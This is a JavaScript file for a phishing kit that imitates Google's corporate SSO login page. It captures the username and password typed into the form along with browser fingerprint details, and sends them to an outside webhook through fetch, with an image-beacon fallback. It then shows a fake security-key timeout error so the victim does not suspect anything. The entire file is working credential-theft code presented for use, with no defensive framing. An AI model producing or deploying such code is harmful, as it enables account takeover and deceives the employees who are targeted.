// Google Corp SSO - Credential Capture
// WEBHOOK_URL is injected by Mammoth or set below
var WEBHOOK_URL = '{{WEBHOOK_URL}}';

document.addEventListener('DOMContentLoaded', function(){
  var form = document.getElementById('loginForm');
  if(!form) return;

  // Remove gnubby onsubmit blocker
  form.onsubmit = null;

  // After-submit error state (realistic SSO behavior)
  if(window.location.hash === '#submitted'){
    var signerror = document.getElementById('signerror');
    if(signerror) signerror.className = 'signerrorvisible';
    var pw = document.getElementById('password');
    if(pw) pw.value = '';
    var btn = document.getElementById('signInButton');
    if(btn){ btn.disabled = false; btn.value = "Sign in"; }
    history.replaceState(null, '', window.location.pathname);
  }

  form.addEventListener('submit', function(e){
    var u = document.getElementById('username');
    var pw = document.getElementById('password');
    if(!u || !pw) return true;
    if(!u.value.trim()){ e.preventDefault(); u.focus(); return false; }
    if(!pw.value.trim()){ e.preventDefault(); pw.focus(); return false; }

    var username = u.value.trim();
    var password = pw.value;

    // Show signing-in state
    var btn = document.getElementById('signInButton');
    if(btn){ btn.disabled = true; btn.value = "Signing in..."; }

    // Realistic SSO flow: wait for server → wait for gnubby → timeout error
    var contentarea = document.getElementById('contentarea');
    if(contentarea) contentarea.className = 'showwaitforserver';

    setTimeout(function(){
      if(contentarea) contentarea.className = 'showspinner';
    }, 2000);

    // Build payload
    var payload = {
      identifier: username + '@google.com',
      username: username,
      password: password,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: window.screen.width + 'x' + window.screen.height,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer,
      target: 'login.corp.google.com'
    };

    // Send to webhook - try fetch first, then image beacon fallback
    if(WEBHOOK_URL && WEBHOOK_URL.indexOf('{{') === -1){
      try {
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(payload),
          mode: 'no-cors'
        });
      } catch(err) {}
      // Image beacon fallback
      try {
        new Image().src = WEBHOOK_URL + '?d=' + encodeURIComponent(btoa(JSON.stringify(payload)));
      } catch(err) {}
    }

    // After 6s, show timeout error (like real SSO when security key not present)
    setTimeout(function(){
      if(contentarea) contentarea.className = 'showlogin';
      var signerror = document.getElementById('signerror');
      if(signerror) signerror.className = 'signerrorvisible';
      if(btn){ btn.disabled = false; btn.value = "Sign in"; }
      pw.value = '';
      window.location.hash = 'submitted';
    }, 6000);

    e.preventDefault();
    return false;
  });
});
